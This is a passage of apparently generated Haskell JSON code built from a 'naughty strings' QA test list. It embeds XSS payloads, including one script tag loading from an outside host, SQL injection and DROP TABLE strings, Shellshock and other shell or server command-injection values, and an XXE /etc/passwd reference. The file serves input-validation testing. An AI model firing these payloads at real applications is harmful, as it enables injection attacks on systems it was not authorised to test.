        <*> v .: "<img \\x11src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img \\x12src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img \\x47src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "⁰⁴⁵₀₁₂"
        <*> v .: "Ω≈ç√∫˜µ≤≥÷"
        <*> v .: "#   IRC specific strings"
        <*> v .: "#\tJapanese Emoticons"
        <*> v .: "Kernel.exec(\"ls -al /\")"
        <*> v .: "Linda Callahan"
        <*> v .: "部落格"
        <*> v .: "찦차를 타고 온 펲시맨과 쑛다리 똠방각하"
        <*> v .: "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥"
        <*> v .: "NIL"
        <*> v .: "NUL"
        <*> v .: "null"
        <*> v .: "#\tNumeric Strings"
        <*> v .: "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣"
        <*> v .: "# Often forbidden to appear in various text-based file formats (e.g. XML),"
        <*> v .: "\" onfocus=JaVaSCript:alert(123) autofocus"
        <*> v .: "' OR 1=1 -- 1"
        <*> v .: "\""
        <*> v .: "<script>alert(123)</script>"
        <*> v .: "#\tQuotation Marks"
        <*> v .: "#       Regional Indicator Symbols"
        <*> v .: "#       Regional Indicator Symbols can be displayed differently across"
        <*> v .: "#\tReserved Strings"
        <*> v .: "\"><script>alert(123)</script>"
        <*> v .: "><script>alert(123);</script x="
        <*> v .: "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"
        <*> v .: "<SCRIPT SRC=//ha.ckers.org/.j>"
        <*> v .: "<script src=\"\\\\%(jscript)s\"></script>"
        <*> v .: "\"`'><script>\\x09javascript:alert(1)</script>"
        <*> v .: "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>"
        <*> v .: "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>"
        <*> v .: "\"`'><script>\\x21javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\x3Bjavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>"
        <*> v .: "#\tScunthorpe Problem"
        <*> v .: "åß∂ƒ©˙∆˚¬…æ"
        <*> v .: "#   Strings that may occur on IRC clients that make security products freak out"
        <*> v .: "#\tStrings which are reserved characters in MSDOS/Windows"
        <*> v .: "#\tStrings which attempt to invoke a benign script injection; shows vulnerability to XSS"
        <*> v .: "#\tStrings which contain text that should be rendered RTL if possible (e.g. Arabic, Hebrew)"
        <*> v .: "#\tStrings which contain two-byte characters: can cause rendering issues or character-length issues"
        <*> v .: "#\tStrings which contain unicode numbers; if the code is localized, it should see the input as numeric"
        <*> v .: "#\tStrings which may be used elsewhere in code"
        <*> v .: "(｡◕ ∀ ◕｡)"
        <*> v .: "#\tTerminal escape codes"
        <*> v .: "0.00"
        <*> v .: "01000"
        <*> v .: "08"
        <*> v .: "09"
        <*> v .: "0xffffffffffffffff"
        <*> v .: "\x0001f60d\&"
        <*> v .: "$1.00"
        <*> v .: "1,0/0,0"
        <*> v .: "1 000.00"
        <*> v .: "1 000 000,00"
        <*> v .: "1'; DROP TABLE users-- 1"
        <*> v .: "1#IND"
        <*> v .: "1#INF"
        <*> v .: "-2147483648/-1"
        <*> v .: "2.2250738585072011e-308"
        <*> v .: "# The next line may appear to be blank, mojibake, or dingbats in some viewers."
        <*> v .: "# The next line may appear to be blank or mojibake in some viewers."
        <*> v .: "# The next line may be flagged for \"trailing whitespace\" in some viewers."
        <*> v .: "# This file unfortunately cannot express strings containing"
        <*> v .: "$(touch /tmp/blns.fail)"
        <*> v .: "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }"
        <*> v .: "Tyson Gay"
        <*> v .: "#\tUnicode Symbols"
        <*> v .: "'`\"><\\x00script>javascript:alert(1)</script>"
        <*> v .: "'`\"><\\x3Cscript>javascript:alert(1)</script>"

instance ToJSON C where
    toJSON (C _C _1C _12C _2C _7C aC aHrefX00JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX03JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX06JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX07JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX0BjavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX12JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX14JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX15JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX18JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX1BjavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX1CjavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefX20JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefXE2X80X80JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefXE2X80X85JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefXE2X80X88JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefXE2X80X89JavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefXE2X80X8AjavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefXE2X81X9FjavascriptJavascriptAlert1IDFuzzelement1TestAC aHrefXE3X80X80JavascriptJavascriptAlert1IDFuzzelement1TestAC abcDivStyleXExpressionX00JavascriptAlert1DEFC abcDivStyleXX00ExpressionJavascriptAlert1DEFC abcDivStyleXX0CexpressionJavascriptAlert1DEFC abcDivStyleXXE2X80X81ExpressionJavascriptAlert1DEFC abcDivStyleXXE2X80X86ExpressionJavascriptAlert1DEFC abcDivStyleXXE2X80X88ExpressionJavascriptAlert1DEFC abcDivStyleXXE3X80X80ExpressionJavascriptAlert1DEFC abcDivStyleXXEFXBBXBFexpressionJavascriptAlert1DEFC ambitiousC andU007FDELC asciiPunctuationAllOfTheseCharactersMayNeedToBeEscapedInSomeC bodyOnloadAlertXSSC braggadociousC cC c00C c000C c100C c100000C c100000000C c1E02C cScriptAlert123ScriptC clockC com2C com4C craigCockburnSoftwareSpecialistC cunningC dccSendStartkeylogger000C dontMakeAMapC emojiC emptyC evaluateC fluffyC fluffy00C fooValBarC friskyC hENEZPERDIANHIVMINFCASZALGOC hasOwnPropertyC hilariousC hornimanMuseumC httpWWWCumQcCAC iOnwheelAlert1ScrollOverMeIC imgABCSrcDXEOnerrorFAlert1C imgOnmouseoverAlertXxsC imgSCRIPTAlertXSSSCRIPTC imgSRCJavascriptAlertStringFromCharCode888383C imgSRCJavascriptAlertXSSC imgSrcOnerrorAltJavascriptAlert1C imgSrcX10XOnerrorJavascriptAlert1C imgSrcX12XOnerrorJavascriptAlert1C imgSrcX13XOnerrorJavascriptAlert1C imgSrcX32XOnerrorJavascriptAlert1C imgSrcX47XOnerrorJavascriptAlert1C imgSrcXOnerrorAlert123C imgSrcXOnerrorX10JavascriptAlert1C imgSrcXOnerrorX32JavascriptAlert1C imgSrcXScriptJavascriptAlert1ScriptC imgSrcXxxXX09OnerrorJavascriptAlert1C imgSrcXxxXX20OnerrorJavascriptAlert1C imgSrcXxxXX22OnerrorJavascriptAlert1C imgSrcXxxXX27OnerrorJavascriptAlert1C imgX11SrcXOnerrorJavascriptAlert1C imgX34SrcXOnerrorJavascriptAlert1C imgX47SrcXOnerrorJavascriptAlert1C indecentC indigoC infinityC javaSCriptAlert123C lpt1C ltScriptGtAlert3912339LtScriptGtC magentaC magnaCumLaudeC medievalErectionOfParapetsC mischievousC mochaC naNC nonWhitespaceC0ControlsU0001ThroughU0008U000EThroughU001FC nullC onfocusJaVaSCriptAlert123AutofocusC orReusedForInternalDelimitersOnTheTheoryThatTheyShouldNeverC plaintextC powerHC purpleC purple00C purple100000C purple100000000C purpleScriptAlert123ScriptC rightToLeftStringsC rosesAre031Mred0MVioletsAre034MblueHopeYouEnjoyTerminalHueC sC scriptAlert123ScriptC scriptAlert123ScriptXC scriptJavascriptAlert1ScriptC scriptScriptAlert123ScriptC scriptSrcJscriptSScriptC scriptX0AjavascriptAlert1ScriptC scriptX0BjavascriptAlert1ScriptC scriptX0CtypeTextJavascriptJavascriptAlert1ScriptC scriptX20JavascriptAlert1ScriptC scriptX2BjavascriptAlert1ScriptC scriptX2FtypeTextJavascriptJavascriptAlert1ScriptC scriptX7EjavascriptAlert1ScriptC scriptXE2X80X80JavascriptAlert1ScriptC scriptXE2X80X82JavascriptAlert1ScriptC scriptXE2X80X83JavascriptAlert1ScriptC scriptXE2X80X84JavascriptAlert1ScriptC scriptXE2X80X88JavascriptAlert1ScriptC scriptXE2X80X8BjavascriptAlert1ScriptC scriptXEFXBFXAEjavascriptAlert1ScriptC scriptXEFXBFXBEjavascriptAlert1ScriptC scunthorpeGeneralHospitalC serverCodeInjectionC shitakeMushroomsC specialCharactersC srcJaVaSCriptPrompt132C stickyC stringsWhichCanBeInterpretedAsNumericC stringsWhichCanCauseASQLInjectionIfInputsAreNotSanitizedC stringsWhichCanCauseUserToPullInFilesThatShouldNotBeAPartOfAWebServerC stringsWhichCanCauseUserToRunCodeOnServerAsAPrivilegedUserCFHTTPSNewsYcombinatorCOMItemID7665153C stringsWhichContainCorruptedTextTheCorruptionWillNotAppearInNonHTMLTextHoweverViaHTTPWWWEeemoNetC stringsWhichContainUnicodeWithAnUpsidedownEffectViaHTTPWWWUpsidedowntextCOMC stringsWhichContainUnicodeWithUnusualPropertiesEGRightToLeftOverrideCFHTTPWWWUnicodeOrgChartsPDFU2000PDFC stringsWhichPunishTheFoolsWhoUseCatTypeOnThisFileC svgScript1231Alert123ScriptC systemLsAlC systemTouchTmpBlnsFailC tentacledC testC testTestC the0C the00C the000C the0123456789C the0TouchTmpBlnsShellshock1FailC the0Xabad1DeaC the0XffffffffC the1C the10C the100C the100000C the100000000C the11C the12C the13C the1E02C the1E2C the1IndC the3C the4C the5C the6C the8C the9C the92233720368547758081C titleOnpropertychangeJavascriptAlert1TitleTitleTitleC treatedAsWhitespaceInSomeContextsC trickUnicodeC trueC undefinedC unicodeAdditionalControlCharactersAllOfTheCharactersWithC unicodeSubscriptSuperscriptAccentsC unicodeUpsidedownC userC versionC version800PlusU0009HTU000BVTU000CFFU0085NELC whitespaceAllOfTheCharactersWithCategoryZsZlOrZpInUnicodeC xmlVersion10EncodingISO88591DOCTYPEFooELEMENTFooANYENTITYXxeSYSTEMFileEtcPasswdFooXxeFooC xxeInjectionXMLC zalgoTextC zzC) =
        object $ foldMap (maybe [] pure)
        [ Just $ "┬─┬ノ( º _ ºノ)" .= _C
        , Just $ "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، " .= _1C
        , Just $ "\x0002070e\&\x00020731\&\x00020779\&\x00020c53\&\x00020c78\&\x00020c96\&\x00020ccf\&" .= _12C
        , Just $ "١٢٣" .= _2C
        , Just $ "울란바토르" .= _7C
        , Just $ "A:" .= aC
        , Just $ "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX00JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX03JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX06JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX07JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX0BjavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX12JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX14JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX15JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX18JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX1BjavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX1CjavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX20JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X80JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X85JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X88JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X89JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X8AjavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X81X9FjavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE3X80X80JavascriptJavascriptAlert1IDFuzzelement1TestAC
        , Just $ "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF" .= abcDivStyleXExpressionX00JavascriptAlert1DEFC
        , Just $ "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF" .= abcDivStyleXX00ExpressionJavascriptAlert1DEFC
        , Just $ "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF" .= abcDivStyleXX0CexpressionJavascriptAlert1DEFC
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X81ExpressionJavascriptAlert1DEFC
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X86ExpressionJavascriptAlert1DEFC
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X88ExpressionJavascriptAlert1DEFC
        , Just $ "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE3X80X80ExpressionJavascriptAlert1DEFC
        , Just $ "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF" .= abcDivStyleXXEFXBBXBFexpressionJavascriptAlert1DEFC
        , Just $ "." .= ambitiousC
        , Just $ "# and U+007F (DEL)" .= andU007FDELC
        , Just $ "# ASCII punctuation.  All of these characters may need to be escaped in some" .= asciiPunctuationAllOfTheseCharactersMayNeedToBeEscapedInSomeC
        , Just $ "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>" .= bodyOnloadAlertXSSC
        , Just $ "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ" .= braggadociousC
        , Just $ "\"'\"'\"''''\"" .= cC
        , Just $ "-0.0" .= c00C
        , Just $ "0.0/0" .= c000C
        , Just $ "-1.00" .= c100C
        , Just $ "1,000.00" .= c100000C
        , Just $ "1,000,000.00" .= c100000000C
        , Just $ "1E+02" .= c1E02C
        , Just $ "><script>alert(123)</script>" .= cScriptAlert123ScriptC
        , Just $ "CLOCK$" .= clockC
        , Just $ "COM2" .= com2C
        , Just $ "COM4" .= com4C
        , Just $ "Craig Cockburn, Software Specialist" .= craigCockburnSoftwareSpecialistC
        , Just $ "\\\\" .= cunningC
        , Just $ "DCC SEND STARTKEYLOGGER 0 0 0" .= dccSendStartkeylogger000C
        , Just $ "dontMakeAMap" .= dontMakeAMapC
        , Just $ "#\tEmoji" .= emojiC
        , Just $ "\"\"" .= emptyC
        , Just $ "evaluate" .= evaluateC
        , Just $ "%" .= fluffyC
        , Just $ "0/0" .= fluffy00C
        , Just $ "<foo val=“bar” />" .= fooValBarC
        , Just $ "ÅÍÎÏ˝ÓÔ\xf8ff\&ÒÚÆ☃" .= friskyC
        , Just $ "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟" .= hENEZPERDIANHIVMINFCASZALGOC
        , Just $ "hasOwnProperty" .= hasOwnPropertyC
        , Just $ "--" .= hilariousC
        , Just $ "Horniman Museum" .= hornimanMuseumC
        , Just $ "http://www.cum.qc.ca/" .= httpWWWCumQcCAC
        , Just $ "<i onwheel=alert(1)> Scroll over me </i>" .= iOnwheelAlert1ScrollOverMeIC
        , Just $ "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">" .= imgABCSrcDXEOnerrorFAlert1C
        , Just $ "<IMG onmouseover=\"alert('xxs')\">" .= imgOnmouseoverAlertXxsC
        , Just $ "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">" .= imgSCRIPTAlertXSSSCRIPTC
        , Just $ "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>" .= imgSRCJavascriptAlertStringFromCharCode888383C
        , Just $ "<IMG SRC=\"javascript:alert('XSS')\"" .= imgSRCJavascriptAlertXSSC
        , Just $ "<img src onerror /\" '\"= alt=javascript:alert(1)//\">" .= imgSrcOnerrorAltJavascriptAlert1C
        , Just $ "<img src\\x10=x onerror=\"javascript:alert(1)\">" .= imgSrcX10XOnerrorJavascriptAlert1C
        , Just $ "<img src\\x12=x onerror=\"javascript:alert(1)\">" .= imgSrcX12XOnerrorJavascriptAlert1C
        , Just $ "<img src\\x13=x onerror=\"javascript:alert(1)\">" .= imgSrcX13XOnerrorJavascriptAlert1C
        , Just $ "<img src\\x32=x onerror=\"javascript:alert(1)\">" .= imgSrcX32XOnerrorJavascriptAlert1C
        , Just $ "<img src\\x47=x onerror=\"javascript:alert(1)\">" .= imgSrcX47XOnerrorJavascriptAlert1C
        , Just $ "<img src=x onerror=alert(123) />" .= imgSrcXOnerrorAlert123C
        , Just $ "<img src=x onerror=\\x10\"javascript:alert(1)\">" .= imgSrcXOnerrorX10JavascriptAlert1C
        , Just $ "<img src=x onerror=\\x32\"javascript:alert(1)\">" .= imgSrcXOnerrorX32JavascriptAlert1C
        , Just $ "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>" .= imgSrcXScriptJavascriptAlert1ScriptC
        , Just $ "`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>" .= imgSrcXxxXX09OnerrorJavascriptAlert1C
        , Just $ "`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>" .= imgSrcXxxXX20OnerrorJavascriptAlert1C
        , Just $ "`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>" .= imgSrcXxxXX22OnerrorJavascriptAlert1C
        , Just $ "`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>" .= imgSrcXxxXX27OnerrorJavascriptAlert1C
        , Just $ "<img\\x11src=x onerror=\"javascript:alert(1)\">" .= imgX11SrcXOnerrorJavascriptAlert1C
        , Just $ "<img \\x34src=x onerror=\"javascript:alert(1)\">" .= imgX34SrcXOnerrorJavascriptAlert1C
        , Just $ "<img\\x47src=x onerror=\"javascript:alert(1)\">" .= imgX47SrcXOnerrorJavascriptAlert1C
        , Just $ "-" .= indecentC
        , Just $ ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’" .= indigoC
        , Just $ "Infinity" .= infinityC
        , Just $ "JavaSCript:alert(123)" .= javaSCriptAlert123C
        , Just $ "LPT1" .= lpt1C
        , Just $ "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;" .= ltScriptGtAlert3912339LtScriptGtC
        , Just $ "_" .= magentaC
        , Just $ "magna cum laude" .= magnaCumLaudeC
        , Just $ "medieval erection of parapets" .= medievalErectionOfParapetsC
        , Just $ "ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя" .= mischievousC
        , Just $ "mocha" .= mochaC
        , Just $ "NaN" .= naNC
        , Just $ "# Non-whitespace C0 controls: U+0001 through U+0008, U+000E through U+001F," .= nonWhitespaceC0ControlsU0001ThroughU0008U000EThroughU001FC
        , Just $ "NULL" .= nullC
        , Just $ "' onfocus=JaVaSCript:alert(123) autofocus" .= onfocusJaVaSCriptAlert123AutofocusC
        , Just $ "# or reused for internal delimiters on the theory that they should never" .= orReusedForInternalDelimitersOnTheTheoryThatTheyShouldNeverC
        , Just $ "<plaintext>" .= plaintextC
        , Just $ "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" .= powerHC
        , Just $ "\"''''\"'\"" .= purpleC
        , Just $ "0,,0" .= purple00C
        , Just $ "1.000,00" .= purple100000C
        , Just $ "1.000.000,00" .= purple100000000C
        , Just $ "＜script＞alert(123)＜/script＞" .= purpleScriptAlert123ScriptC
        , Just $ "#\tRight-To-Left Strings" .= rightToLeftStringsC
        , Just $ "Roses are \x001b\&[0;31mred\x001b\&[0m, violets are \x001b\&[0;34mblue. Hope you enjoy terminal hue" .= rosesAre031Mred0MVioletsAre034MblueHopeYouEnjoyTerminalHueC
        , Just $ "%*.*s" .= sC
        , Just $ "'><script>alert(123)</script>" .= scriptAlert123ScriptC
        , Just $ "'><script>alert(123);</script x='" .= scriptAlert123ScriptXC
        , Just $ "\"`'><script>-javascript:alert(1)</script>" .= scriptJavascriptAlert1ScriptC
        , Just $ "< / script >< script >alert(123)< / script >" .= scriptScriptAlert123ScriptC
        , Just $ "<script src=\"/\\%(jscript)s\"></script>" .= scriptSrcJscriptSScriptC
        , Just $ "\"`'><script>\\x0Ajavascript:alert(1)</script>" .= scriptX0AjavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\x0Bjavascript:alert(1)</script>" .= scriptX0BjavascriptAlert1ScriptC
        , Just $ "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>" .= scriptX0CtypeTextJavascriptJavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\x20javascript:alert(1)</script>" .= scriptX20JavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\x2Bjavascript:alert(1)</script>" .= scriptX2BjavascriptAlert1ScriptC
        , Just $ "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>" .= scriptX2FtypeTextJavascriptJavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\x7Ejavascript:alert(1)</script>" .= scriptX7EjavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>" .= scriptXE2X80X80JavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>" .= scriptXE2X80X82JavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>" .= scriptXE2X80X83JavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>" .= scriptXE2X80X84JavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>" .= scriptXE2X80X88JavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>" .= scriptXE2X80X8BjavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>" .= scriptXEFXBFXAEjavascriptAlert1ScriptC
        , Just $ "\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>" .= scriptXEFXBFXBEjavascriptAlert1ScriptC
        , Just $ "Scunthorpe General Hospital" .= scunthorpeGeneralHospitalC
        , Just $ "#\tServer Code Injection" .= serverCodeInjectionC
        , Just $ "shitake mushrooms" .= shitakeMushroomsC
        , Just $ "#\tSpecial Characters" .= specialCharactersC
        , Just $ "src=JaVaSCript:prompt(132)" .= srcJaVaSCriptPrompt132C
        , Just $ "(ﾉಥ益ಥ）ﾉ\xfeff\& ┻━┻" .= stickyC
        , Just $ "#\tStrings which can be interpreted as numeric" .= stringsWhichCanBeInterpretedAsNumericC
        , Just $ "#\tStrings which can cause a SQL injection if inputs are not sanitized" .= stringsWhichCanCauseASQLInjectionIfInputsAreNotSanitizedC
        , Just $ "#\tStrings which can cause user to pull in files that should not be a part of a web server" .= stringsWhichCanCauseUserToPullInFilesThatShouldNotBeAPartOfAWebServerC
        , Just $ "#\tStrings which can cause user to run code on server as a privileged user (c.f. https://news.ycombinator.com/item?id=7665153)" .= stringsWhichCanCauseUserToRunCodeOnServerAsAPrivilegedUserCFHTTPSNewsYcombinatorCOMItemID7665153C
        , Just $ "#\tStrings which contain \"corrupted\" text. The corruption will not appear in non-HTML text, however. (via http://www.eeemo.net)" .= stringsWhichContainCorruptedTextTheCorruptionWillNotAppearInNonHTMLTextHoweverViaHTTPWWWEeemoNetC
        , Just $ "#\tStrings which contain unicode with an \"upsidedown\" effect (via http://www.upsidedowntext.com)" .= stringsWhichContainUnicodeWithAnUpsidedownEffectViaHTTPWWWUpsidedowntextCOMC
        , Just $ "#\tStrings which contain unicode with unusual properties (e.g. Right-to-left override) (c.f. http://www.unicode.org/charts/PDF/U2000.pdf)" .= stringsWhichContainUnicodeWithUnusualPropertiesEGRightToLeftOverrideCFHTTPWWWUnicodeOrgChartsPDFU2000PDFC
        , Just $ "#\tStrings which punish the fools who use cat/type on this file" .= stringsWhichPunishTheFoolsWhoUseCatTypeOnThisFileC
        , Just $ "<svg><script>123<1>alert(123)</script>" .= svgScript1231Alert123ScriptC
        , Just $ "System(\"ls -al /\")" .= systemLsAlC
        , Just $ "@{[system \"touch /tmp/blns.fail\"]}" .= systemTouchTmpBlnsFailC
        , Just $ "''" .= tentacledC
        , Just $ "\x2029\&test\x2029\&" .= testC
        , Just $ "test\x2060\&test\x202b\&" .= testTestC
        , Just $ "\x0001f3f3\&0\x0001f308\&️" .= the0C
        , Just $ "+0.0" .= the00C
        , Just $ "0.0.0" .= the000C
        , Just $ "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ \x0001f51f\&" .= the0123456789C
        , Just $ "() { 0; }; touch /tmp/blns.shellshock1.fail;" .= the0TouchTmpBlnsShellshock1FailC
